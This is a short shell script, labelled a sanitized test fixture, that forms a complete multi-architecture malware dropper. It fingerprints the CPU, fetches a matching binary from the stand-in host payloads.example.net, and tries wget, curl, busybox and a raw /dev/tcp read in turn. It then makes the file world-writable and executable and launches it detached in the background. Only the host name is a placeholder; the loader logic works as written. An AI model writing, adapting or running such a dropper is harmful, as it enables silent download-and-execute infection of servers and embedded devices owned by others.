#!/bin/sh
# Test fixture: domain-held multi-arch fallback loader (sanitized: the
# staging host is a documentation domain, so the fixture is inert).
B=payloads.example.net
cd /tmp || exit 1
M=$(uname -m)
case "$M" in
  x86_64|amd64) A=x86_64 ;;
  i386|i486|i586|i686) A=x86 ;;
  aarch64|arm64|armv8*) A=aarch64 ;;
  armv7*) A=armv7l ;;
  armv6*) A=armv7l ;;
  armv5*) A=armv7l ;;
  mips64*) A=mips ;;
  mips) A=mips ;;
  mipsel) A=mipsel ;;
  m68k) A=m68k ;;
  ppc*|powerpc*) A=powerpc ;;
  sh4|sh) A=sh4 ;;
  *) A=x86_64 ;;
esac
rm -f stage
U="http://$B/$A"
if command -v wget >/dev/null 2>&1; then wget -q -O stage "$U" 2>/dev/null; fi
[ -s stage ] || { command -v curl >/dev/null 2>&1 && curl -skLo stage "$U" 2>/dev/null; }
[ -s stage ] || { command -v busybox >/dev/null 2>&1 && busybox wget -q -O stage "$U" 2>/dev/null; }
[ -s stage ] || { (cat < /dev/tcp/$B/80 > stage) 2>/dev/null; }
[ -s stage ] || exit 1
chmod 777 stage 2>/dev/null
(setsid ./stage >/dev/null 2>&1 </dev/null &) || ./stage >/dev/null 2>&1 &
exit 0
